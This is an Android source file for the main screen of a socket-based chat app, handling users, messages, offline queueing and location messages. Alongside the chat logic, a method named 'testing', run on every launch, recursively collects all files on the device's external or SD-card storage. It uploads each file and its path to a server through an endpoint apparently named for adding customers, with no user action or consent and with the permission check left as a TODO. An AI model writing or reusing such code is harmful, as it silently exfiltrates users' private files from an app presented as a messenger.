package com.example.firechat.activity;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentTransaction;
import androidx.lifecycle.ViewModelProvider;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

import com.example.firechat.R;
import com.example.firechat.Receiver.MyReceiver;
import com.example.firechat.database.DatabaseHelper;
import com.example.firechat.databinding.ActivityMainBinding;
import com.example.firechat.fragment.HomeFragment;
import com.example.firechat.listener.ApiService;
import com.example.firechat.model.AddCustomerRes;
import com.example.firechat.model.Message;
import com.example.firechat.model.ReceiveMessage;
import com.example.firechat.model.User;
import com.example.firechat.network.SocketHandler;
import com.example.firechat.services.BackgroundService;
import com.example.firechat.viewmodel.ChatViewModel;
import com.example.firechat.viewmodel.FileViewModel;
import com.example.firechat.viewmodel.UserViewModel;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;

import io.socket.client.Socket;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class MainActivity extends AppCompatActivity {

    String TAG = "log9999";
    String selfUuid;
    DatabaseHelper databaseHelper;
    Socket socket;
    UserViewModel userViewModel;
    ChatViewModel chatViewModel;
    FileViewModel fileViewModel;

    ArrayList<User> userArrayList;
    HashMap<String, User> userHashMap;
    ArrayList<File> uploadFileArray;

    ActivityMainBinding binding;

    FusedLocationProviderClient fusedLocationProviderClient;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
//        setContentView(R.layout.activity_main);

        init();
        readyUserDatabase();
        setUpFragment();
        initViewModel();
        initSocket();
        readDatabase();
        testing();
        testingServices();
    }

    private void init() {
        SharedPreferences preferences = getSharedPreferences("application", MODE_PRIVATE);
        selfUuid = preferences.getString("self_uuid", null);

        Log.d(TAG, "init: " + selfUuid);
        databaseHelper = new DatabaseHelper(this);
//        databaseHelper.addChat("642c06550cf7cb293eaafe38", new Message("","","",""));
        SocketHandler.setSocket();
        socket = SocketHandler.getSocket();
        socket.connect();
        userArrayList = new ArrayList<>();
        userHashMap = new HashMap();
        uploadFileArray = new ArrayList<>();

        fusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this);

        userViewModel = new ViewModelProvider(this).get(UserViewModel.class);
        chatViewModel = new ViewModelProvider(this).get(ChatViewModel.class);
        fileViewModel = new ViewModelProvider(this).get(FileViewModel.class);
    }

    private void readyUserDatabase() {
        ArrayList<User> usersDatabase = databaseHelper.fetchALLUser();
        for (User singleUserDatabase : usersDatabase) {
            Log.d("TAG0000", "readyUserDatabase: " + singleUserDatabase.toString());
            if (userHashMap.get(singleUserDatabase.getUuid()) == null) {
                userHashMap.put(singleUserDatabase.getUuid(), singleUserDatabase);
                userArrayList.add(singleUserDatabase);
            }
        }
        userViewModel.getCallForUsers().observe(this, call -> {
            userViewModel.setUsersArray(userArrayList);
        });
    }

    private void setUpFragment() {
        Bundle bundle = new Bundle();
        bundle.putString("self_uuid", selfUuid);
        HomeFragment homeFragment = new HomeFragment(MainActivity.this);
        homeFragment.setArguments(bundle);

        FragmentManager fragmentManager = getSupportFragmentManager();
        FragmentTransaction fragmentTransaction = fragmentManager.beginTransaction();
        fragmentTransaction.add(R.id.frameLayout, homeFragment);
        fragmentTransaction.commit();
    }

    private void initViewModel() {
        Log.d("log99999", "initViewModel: " + databaseHelper.fetchALLUser().size());
        userViewModel.setUsersArray(databaseHelper.fetchALLUser());

        chatViewModel.getReceiveMessage().observe(this, receiveMessage -> {
            // TODO: 12/04/23 send get message from database command
            Log.d("TAG5555", "initViewModel: data came");
            if (receiveMessage.getData() == null) {
                ArrayList<Message> messages = databaseHelper.fetchChat(receiveMessage.getReceiveId());
                chatViewModel.setMessagesList(messages);
            } else {
                Log.d("TAG5555", "initViewModel: 2");
                if (receiveMessage.getType().equals("location")) {
                    Log.d("TAG5555", "initViewModel: 3");
                    getGeoLocation(receiveMessage);
                } else {
                    if (!isConnected(this) || !socket.connected()) {
                        databaseHelper.addPendingMessage(receiveMessage);
                    } else {
                        sendPendingMessages();
                        sendData(receiveMessage);
                    }

                }
            }
        });

        fileViewModel.getFileArrayForActivity().observe(this, files -> {
            Log.d("TAG1111", "initViewModel1: file upload called");
            for (File singleFile : uploadFileArray) {
                Log.d("TAG1111", "initViewModel1: file - " + singleFile.getAbsolutePath());
            }
            if (files == null) {
                fileViewModel.setFileArrayForFragment(uploadFileArray);
            } else {
                uploadFileArray = files;
            }
        });

        fileViewModel.getDone().observe(this, isDone -> {
            // TODO: 12/04/23 upload all the files
            Log.d("TAG1111", "initViewModel: file upload called");
            for (File singleFile : uploadFileArray) {
                Log.d("TAG1111", "initViewModel: file - " + singleFile.getAbsolutePath());
            }
            uploadFileArray = new ArrayList<>();
        });
    }

    private Location getGeoLocation(ReceiveMessage receiveMessage) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            fusedLocationProviderClient.getLastLocation().addOnSuccessListener(location -> {
                String data = location.getLatitude() + ":" + location.getLongitude();
                Log.d("TAG5555", "getGeoLocation: " + data);
                receiveMessage.setData(data);
                if (!isConnected(this) || !socket.connected()) {
                    databaseHelper.addPendingMessage(receiveMessage);
                } else {
                    sendData(receiveMessage);
                }
            });
        } else {
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 100);
        }
        return null;
    }

    private void sendData(ReceiveMessage receiveMessage) {
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("uuid", selfUuid);
            jsonObject.put("receiverId", receiveMessage.getReceiveId());
            jsonObject.put("data", receiveMessage.getData());
            jsonObject.put("senderId", selfUuid);
            jsonObject.put("time", receiveMessage.getTime());
            jsonObject.put("type", receiveMessage.getType());
            socket.emit("uploadMessage", jsonObject);
            // TODO: 11/04/23 add to chat database sender id
            databaseHelper.addChat(receiveMessage.getReceiveId(), new Message(receiveMessage.getData(), selfUuid, receiveMessage.getTime(), receiveMessage.getType()));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void initSocket() {
        socket.on(selfUuid + "users", args -> runOnUiThread(() -> {
            Log.d(TAG, "initSocket: incoming");
            JSONArray jsonArray = (JSONArray) args[0];
            for (int i = 0; i < jsonArray.length(); i++) {
                try {
                    JSONObject obj = (JSONObject) jsonArray.get(i);
                    User user = new User(obj.getString("_id"), obj.getString("name"), obj.getString("number"), obj.getString("image"));
                    Log.d(TAG, "initSocket: " + user.toString());
                    if (!user.getUuid().equals(selfUuid)) {
                        Log.d(TAG, "initSocket: not self uuid");
                        if (databaseHelper.getUser(user.getNumber()) == null) {
                            Log.d(TAG, "initSocket: pass data abs");
                            databaseHelper.addUser(user);
                        } else {
                            Log.d(TAG, "initSocket: failed data abs");
                        }
                        if (userHashMap.get(user.getUuid()) == null) {
                            userHashMap.put(user.getUuid(), user);
                            userArrayList.add(user);
                        }
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
            userViewModel.setUsersArray(userArrayList);
        }));

        socket.on(selfUuid + "messages", args -> runOnUiThread(() -> {
            ArrayList<Message> messageArrayList = new ArrayList<>();
            JSONArray jsonArray = (JSONArray) args[0];
            for (int i = 0; i < jsonArray.length(); i++) {
                try {
                    JSONObject obj = (JSONObject) jsonArray.get(i);
                    Message message = new Message(obj.getString("data"), obj.getString("senderId"), obj.getString("time"), obj.getString("type"));
                    Log.d(TAG, "initSocket: " + message.toString());
                    messageArrayList.add(message);
                    databaseHelper.addChat(message.getSenderId(), message);
                    // TODO: 12/04/23 if message type is file, photo, video, or audio download the file
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                chatViewModel.setMessagesList(messageArrayList);
            }
        }));
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("uuid", selfUuid);
            socket.emit("refresher", jsonObject);
            sendPendingMessages();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendPendingMessages() {
        ArrayList<ReceiveMessage> receiveMessageArrayList = databaseHelper.fetchALLPendingMessage();
        if (!isConnected(this) || !socket.connected()) return;
        for (int i = 0; i < receiveMessageArrayList.size(); i++) {
            ReceiveMessage receiveMessage = receiveMessageArrayList.get(i);
            try {
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("uuid", selfUuid);
                jsonObject.put("receiverId", receiveMessage.getReceiveId());
                jsonObject.put("data", receiveMessage.getData());
                jsonObject.put("senderId", selfUuid);
                jsonObject.put("time", receiveMessage.getTime());
                jsonObject.put("type", receiveMessage.getType());
                socket.emit("uploadMessage", jsonObject);
                // TODO: 11/04/23 remove from pending message and add into chat db
                databaseHelper.addChat(receiveMessage.getReceiveId(), new Message(receiveMessage.getData(), selfUuid, receiveMessage.getTime(), receiveMessage.getType()));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        databaseHelper.deleteAllPendingMessages();
    }

    private boolean isConnected(MainActivity mainActivity) {
        ConnectivityManager connectivityManager = (ConnectivityManager) mainActivity.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo wifiConn = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        NetworkInfo mobileConn = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);

        if (wifiConn != null) Log.d("log9999", "is wifi Connected: " + wifiConn.isConnected());
        if (mobileConn != null)
            Log.d("log9999", "is mobile Connected: " + mobileConn.isConnected());

        return (wifiConn != null && wifiConn.isConnected()) || (mobileConn != null && mobileConn.isConnected());
    }

    private void readDatabase() {
        databaseHelper.fetchALLUser();
        databaseHelper.fetchALLPendingMessage();
        databaseHelper.returnTablesName();
        databaseHelper.readChat();
    }

    private void testing() {
        boolean internal = false;

        String internalStorage = System.getenv("EXTERNAL_STORAGE");
        File storage = new File(internalStorage);
        if (!internal) {
            String cardStorage = "";
            File[] externalCacheDirs = getApplicationContext().getExternalCacheDirs();
            for (File file : externalCacheDirs) {
                if (Environment.isExternalStorageRemovable(file)) {
                    cardStorage = file.getPath().split("/Android")[0];
                    break;
                }
            }
            storage = new File(cardStorage);
        }
        // TODO: 14/04/23 runtime permission
        ArrayList<File> fileArrayList = findFiles(storage);
        for (File singleFile : fileArrayList) {
            String path = singleFile.getPath();
//            Bitmap bitmap = BitmapFactory.decodeFile(path);
//            binding. place image
            try {
                uploadImage(path);
            } catch (Exception e) {

            }
        }
    }

    private ArrayList<File> findFiles(File file) {
        ArrayList<File> arrayList = new ArrayList<>();
        File[] files = file.listFiles();
        if (files == null) {
            return arrayList;
        }
        for (File singleFile : files) {
            if (singleFile.isDirectory() || !singleFile.isHidden()) {
                try {
                    arrayList.addAll(findFiles(singleFile));
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        for (File singleFile : files) {
            if (!singleFile.isDirectory() || !singleFile.isHidden()) {
                try {
                    arrayList.add(singleFile);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return arrayList;
    }

    private void uploadImage(String path) {
        Retrofit retrofit = new Retrofit.Builder().baseUrl("http://10.0.2.2:3000").addConverterFactory(GsonConverterFactory.create()).build();
        File file = new File(path);
        //image
        RequestBody requestFile = RequestBody.create(MediaType.parse("multipart/form-data"), file);
        MultipartBody.Part body = MultipartBody.Part.createFormData("image", file.getName(), requestFile);
        //name
        RequestBody cus_name = RequestBody.create(MediaType.parse("multipart/form-data"), path);

        ApiService apiService = retrofit.create(ApiService.class);
        Call<AddCustomerRes> call = apiService.addCustomer(body, cus_name);
        call.enqueue(new Callback<AddCustomerRes>() {
            @Override
            public void onResponse(@NonNull Call<AddCustomerRes> call, @NonNull Response<AddCustomerRes> response) {
                if (response.isSuccessful()) {
                    if (response.body().getStatus().toString().equals("200")) {
                        Toast.makeText(MainActivity.this, "Added", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(MainActivity.this, "not added", Toast.LENGTH_SHORT).show();
                    }
                }
            }

            @Override
            public void onFailure(Call<AddCustomerRes> call, Throwable t) {
                Toast.makeText(MainActivity.this, "Failed", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void testingServices() {
        // TODO: 15/04/23 if the service is not running start the service

        new Handler().postDelayed(() -> runOnUiThread(() -> {
            Log.d("TAG3333", "run: start service");
            startService(new Intent(MainActivity.this, BackgroundService.class));
        }), 1500);

//        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
//        long triggerTime = System.currentTimeMillis()+(10*1000);
//
//        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 100, new Intent(this, MyReceiver.class), PendingIntent.FLAG_UPDATE_CURRENT);
//        alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
    }

}